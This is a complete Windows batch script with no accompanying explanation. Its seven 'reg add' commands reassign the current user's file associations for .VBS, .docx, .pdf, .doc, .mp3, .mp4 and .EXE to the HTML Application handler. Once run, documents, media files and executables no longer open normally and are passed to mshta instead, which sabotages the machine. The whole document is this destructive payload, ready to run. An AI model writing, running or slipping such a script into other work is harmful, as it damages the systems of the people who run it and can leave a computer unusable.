@echo off
reg add HKCU\Software\Classes\.VBS /d "htafile" /f
reg add HKCU\Software\Classes\.docx /d "htafile" /f
reg add HKCU\Software\Classes\.pdf /d "htafile" /f
reg add HKCU\Software\Classes\.doc /d "htafile" /f
reg add HKCU\Software\Classes\.mp3 /d "htafile" /f
reg add HKCU\Software\Classes\.mp4 /d "htafile" /f
reg add HKCU\Software\Classes\.EXE /d "htafile" /f
exit